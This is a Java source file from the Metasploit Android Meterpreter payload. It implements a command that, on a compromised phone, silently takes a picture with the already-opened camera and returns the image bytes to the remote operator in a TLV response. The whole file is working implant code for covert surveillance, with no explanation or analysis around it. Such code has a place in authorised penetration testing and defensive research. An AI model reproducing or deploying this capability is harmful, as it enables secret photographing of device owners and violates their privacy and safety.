
package com.metasploit.meterpreter.android;

import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.PictureCallback;
import android.util.Log;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.stdapi.webcam_audio_record;

public class webcam_get_frame_android extends webcam_audio_record implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_WEBCAM_IMAGE = TLVPacket.TLV_META_TYPE_RAW | (TLV_EXTENSIONS + 1);
    private static final int TLV_TYPE_WEBCAM_QUALITY = TLVPacket.TLV_META_TYPE_UINT | (TLV_EXTENSIONS + 3);

    private byte[] cameraData;

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {

        int quality = request.getIntValue(TLV_TYPE_WEBCAM_QUALITY);
                
        try {
            if (webcam_start_android.camera == null) {
                return ERROR_FAILURE;
            }

            cameraData = null;
            //Parameters params = webcam_start_android.camera.getParameters();
            //params.setPictureFormat(PixelFormat.JPEG);
            //params.set("jpeg-quality", quality);
            webcam_start_android.camera.takePicture(null, null, new PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    cameraData = data;
                    synchronized (webcam_get_frame_android.this) {
                    	webcam_get_frame_android.this.notify();
                    }
                }
            });
            
            synchronized (this) {
            	wait(10000);
            }

            if (cameraData != null) {
            	response.add(TLV_TYPE_WEBCAM_IMAGE, cameraData);
            }
        } catch (Exception e) {
            Log.e(getClass().getSimpleName(), "webcam error ", e);
        }

        return ERROR_SUCCESS;
    }
}
